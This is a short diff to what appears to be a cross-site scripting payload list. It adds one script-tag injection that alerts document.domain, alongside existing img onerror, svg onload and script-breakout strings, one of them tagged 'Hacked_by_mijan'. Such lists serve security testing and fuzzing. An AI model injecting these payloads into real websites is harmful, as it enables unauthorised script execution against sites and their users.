@@ -2,3 +2,4 @@
 <Img Src=OnXSS OnError=confirm("Hacked_by_mijan")>
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
 http://example.com/services"><script>alert(1)</script>/services/
+KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
